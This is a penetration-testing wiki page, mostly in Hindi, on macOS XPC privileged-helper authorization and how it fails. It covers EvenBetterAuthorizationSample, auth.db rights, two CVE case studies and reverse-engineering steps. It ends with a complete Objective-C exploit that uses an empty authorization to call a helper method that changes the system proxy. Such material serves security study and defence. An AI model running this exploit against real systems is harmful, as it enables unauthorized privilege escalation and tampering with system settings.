# macOS XPC प्राधिकरण

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC प्राधिकरण

Apple एक और तरीका भी प्रस्तावित करता है प्रमाणीकृत करने का, जब कनेक्ट करने वाली प्रक्रिया के पास **exposed XPC method को कॉल करने की permissions** हों।

जब किसी application को **privileged user के रूप में actions execute करने** की जरूरत होती है, तो उस app को privileged user के रूप में चलाने की बजाय यह आमतौर पर root के रूप में एक HelperTool को XPC service के रूप में इंस्टॉल करता है जिसे app से कॉल करके वे क्रियाएँ की जा सकती हैं। हालांकि, सेवा को कॉल करने वाले app के पास पर्याप्त authorization होना चाहिए।

### ShouldAcceptNewConnection always YES

एक उदाहरण [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) में पाया जा सकता है। `App/AppDelegate.m` में यह **connect** करने की कोशिश करता है **HelperTool** से। और `HelperTool/HelperTool.m` में फ़ंक्शन **`shouldAcceptNewConnection`** पहले बताई गई किसी भी आवश्यकताओं की **जाँच नहीं करेगा**। यह हमेशा YES लौटाएगा:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
इस जांच को सही ढंग से कॉन्फ़िगर करने के बारे में अधिक जानकारी के लिए:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### एप्लिकेशन अधिकार

हालाँकि, HelperTool के किसी मेथड को कॉल करने पर कुछ **प्राधिकरण हो रहा होता है**।

`App/AppDelegate.m` का फ़ंक्शन **`applicationDidFinishLaunching`** ऐप शुरू होने के बाद एक खाली प्राधिकरण संदर्भ बनाएगा। यह हमेशा काम करना चाहिए।\
फिर यह उस प्राधिकरण संदर्भ में कुछ अधिकार **जोड़ने** की कोशिश करेगा, `setupAuthorizationRights` को कॉल करके:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
फ़ंक्शन `setupAuthorizationRights` जो `Common/Common.m` में है, auth डेटाबेस `/var/db/auth.db` में एप्लिकेशन के अधिकार सेव करेगा। ध्यान दें कि यह केवल उन अधिकारों को ही जोड़ता है जो अभी तक डेटाबेस में नहीं हैं:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
फ़ंक्शन `enumerateRightsUsingBlock` उन एप्लिकेशन अनुमतियों को प्राप्त करने के लिए उपयोग किया जाने वाला फ़ंक्शन है, जो `commandInfo` में परिभाषित हैं:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
This means that at the end of this process, the permissions declared inside `commandInfo` will be stored in `/var/db/auth.db`. Note how there you can find for **each method** that will r**equire authentication**, **permission name** and the **`kCommandKeyAuthRightDefault`**. The later one **indicates who can get this right**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

<table><thead><tr><th width="284.3333333333333">नाम</th><th width="165">मान</th><th>विवरण</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>कोई भी</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>कोई नहीं</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>वर्तमान उपयोगकर्ता को admin होना चाहिए (admin समूह के भीतर)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>उपयोगकर्ता से प्रमाणीकरण करने के लिए कहें।</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>उपयोगकर्ता से प्रमाणीकरण करने के लिए कहें। उसे admin होना आवश्यक है (admin समूह के भीतर)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>नियम निर्दिष्ट करें</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>अधिकार पर कुछ अतिरिक्त टिप्पणियाँ निर्दिष्ट करें</td></tr></tbody></table>

### अधिकार सत्यापन

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **execute such method** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **correct format** and then will check **what is needed to get the right** to call the specific method. If all goes good the **returned `error` will be `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
ध्यान दें कि उस मेथड को कॉल करने के लिए **अधिकार प्राप्त करने की आवश्यकताओं की जाँच** करने के लिए फ़ंक्शन `authorizationRightForCommand` सिर्फ़ पहले टिप्पणी किए गए ऑब्जेक्ट **`commandInfo`** की जाँच करेगा। फिर यह **`AuthorizationCopyRights`** को कॉल करेगा यह जाँचने के लिए कि फ़ंक्शन को कॉल करने के लिए **क्या उसके पास अधिकार हैं** (ध्यान दें कि flags उपयोगकर्ता के साथ इंटरैक्शन की अनुमति देते हैं)।

इस मामले में, फ़ंक्शन `readLicenseKeyAuthorization` को कॉल करने के लिए `kCommandKeyAuthRightDefault` को `@kAuthorizationRuleClassAllow` के रूप में परिभाषित किया गया है। इसलिए **कोई भी इसे कॉल कर सकता है**।

### DB जानकारी

यह बताया गया था कि यह जानकारी `/var/db/auth.db` में संग्रहीत है। आप सभी संग्रहित नियमों को इस तरह सूचीबद्ध कर सकते हैं:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
फिर, आप यह पढ़ सकते हैं कि कौन उस अधिकार तक पहुँच सकता है:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### अनुमत अधिकार

आप **सभी अनुमतियों की कॉन्फ़िगरेशन** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/) में पा सकते हैं, लेकिन ऐसे संयोजन जो उपयोगकर्ता की इंटरैक्शन की आवश्यकता नहीं करेंगे वे निम्न होंगे:

1. **'authenticate-user': 'false'**
- यह सबसे सीधा कुंजी है।
- यदि इसे `false` पर सेट किया गया है, तो यह निर्दिष्ट करता है कि किसी उपयोगकर्ता को यह अधिकार प्राप्त करने के लिए प्रमाणीकरण प्रदान करने की आवश्यकता नहीं है।
- यह नीचे दिए गए 2 में से किसी एक के साथ या किसी ऐसे समूह को निर्दिष्ट करने के साथ उपयोग किया जाता है जिसके सदस्य होने पर उपयोगकर्ता को यह अधिकार मिल सकता है।
2. **'allow-root': 'true'**
- यदि उपयोगकर्ता root user (जिसके पास उच्चाधिकार हैं) के रूप में ऑपरेट कर रहा है, और यह कुंजी `true` पर सेट है, तो root user संभावित रूप से बिना अतिरिक्त प्रमाणीकरण के यह अधिकार प्राप्त कर सकता है। हालाँकि, सामान्यतः root user की स्थिति प्राप्त करने के लिए पहले से ही प्रमाणीकरण आवश्यक होता है, इसलिए अधिकांश उपयोगकर्ताओं के लिए यह एक "कोई प्रमाणीकरण नहीं" स्थिति नहीं है।
3. **'session-owner': 'true'**
- यदि इसे `true` पर सेट किया गया है, तो session का मालिक (वर्तमान में लॉग-इन किया हुआ उपयोगकर्ता) स्वतः यह अधिकार प्राप्त कर लेगा। यदि उपयोगकर्ता पहले से लॉग-इन है तो यह अतिरिक्त प्रमाणीकरण को बाईपास कर सकता है।
4. **'shared': 'true'**
- यह कुंजी प्रमाणीकरण के बिना अधिकार नहीं देती। बल्कि, यदि इसे `true` पर सेट किया गया है, तो इसका मतलब है कि एक बार जब अधिकार प्रमाणीकृत हो जाता है, तो इसे कई प्रक्रियाओं में साझा किया जा सकता है बिना हर एक को फिर से प्रमाणीकरण करने की आवश्यकता के। लेकिन अधिकार का प्रारंभिक प्रदान करना तब भी प्रमाणीकरण की आवश्यकता करेगा जब तक कि इसे अन्य कुंजी जैसे `'authenticate-user': 'false'` के साथ संयोजित न किया गया हो।

You can [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass केस स्टडीज़

- **CVE-2024-4395 – Jamf Compliance Editor helper**: एक audit चलाने पर `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` डाला जाता है, Mach service `com.jamf.complianceeditor.helper` एक्सपोज़ होता है, और `-executeScriptAt:arguments:then:` export किया जाता है बिना caller के `AuthorizationExternalForm` या कोड सिग्नेचर की जाँच किए। A trivial exploit `AuthorizationCreate`s एक empty reference, `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` से कनेक्ट करता है, और method को invoke करके arbitrary binaries को root के रूप में execute कर देता है। Full reversing notes (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 and 7.4.0–7.4.2 ने crafted XPC messages स्वीकार किए जो एक privileged helper तक पहुँचते थे जिसमें authorization gates मौजूद नहीं थे। क्योंकि helper अपने ही privileged `AuthorizationRef` पर भरोसा करता था, कोई भी लोकल यूज़र जो service को message भेज सकता था उसे मजबूर कर सकता था कि वह arbitrary configuration changes या commands को root के रूप में execute कराए। Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Rapid triage टिप्स

- जब कोई app दोनों GUI और helper के साथ आता है, तो उनके code requirements में diff करें और चेक करें कि क्या `shouldAcceptNewConnection` listener को `-setCodeSigningRequirement:` से lock करता है (या `SecCodeCopySigningInformation` को validate करता है)। Missing checks आमतौर पर CWE-863 जैसे परिदृश्यों को जन्म देते हैं, जैसा Jamf केस में हुआ। A quick peek looks like:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- तुलना करें कि helper *सोचता है* कि यह किसे authorizing कर रहा है और client क्या सप्लाई करता है। रीवर्स करते समय, `AuthorizationCopyRights` पर ब्रेक लगाएँ और पुष्टि करें कि `AuthorizationRef` `AuthorizationCreateFromExternalForm` (client द्वारा प्रदान) से उत्पन्न हुआ है न कि helper के अपने privileged context से; वरना संभवतः आप ऊपर दिए मामलों जैसे CWE-863 पैटर्न पाएंगे।

## ऑथराइज़ेशन का रिवर्स इंजीनियरिंग

### जांचें कि EvenBetterAuthorization उपयोग हो रहा है या नहीं

यदि आपको यह function मिलता है: **`[HelperTool checkAuthorization:command:]`** तो सम्भवतः प्रोसेस पिछले उल्लेखित schema का उपयोग कर रही है authorization के लिए:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

यदि यह function ऐसे functions को call कर रहा है जैसे `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, तो यह [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) का उपयोग कर रहा है।

Check the **`/var/db/auth.db`** यह देखने के लिए कि क्या user interaction के बिना कुछ privileged action कॉल करने की permissions हासिल करना संभव है।

### प्रोटोकॉल संचार

फिर, आपको protocol schema ढूँढनी होगी ताकि XPC service के साथ संचार स्थापित किया जा सके।

फ़ंक्शन **`shouldAcceptNewConnection`** exported किए जा रहे protocol को संकेत करता है:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

इस मामले में, हमारे पास EvenBetterAuthorizationSample जैसा ही है, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

उपयोग किए गए protocol का नाम जानने के बाद, आप इसके header definition को **dump** कर सकते हैं:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
अंत में, उसके साथ संचार स्थापित करने के लिए हमें केवल **exposed Mach Service का नाम** जानना होगा। इसे खोजने के कई तरीके हैं:

- **`[HelperTool init]`** में जहाँ आप Mach Service का उपयोग होते हुए देख सकते हैं:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist में:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit उदाहरण

इस उदाहरण में निम्न बनाए गए हैं:

- प्रोटोकॉल की परिभाषा, जिसमें फ़ंक्शन्स शामिल हैं
- एक खाली auth जिसका उपयोग एक्सेस के लिए अनुरोध करने हेतु किया जाता है
- XPC सेवा के साथ एक कनेक्शन
- यदि कनेक्शन सफल हो तो फ़ंक्शन को कॉल करना
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## अन्य XPC privilege हेल्पर्स का दुरुपयोग

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## संदर्भ

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
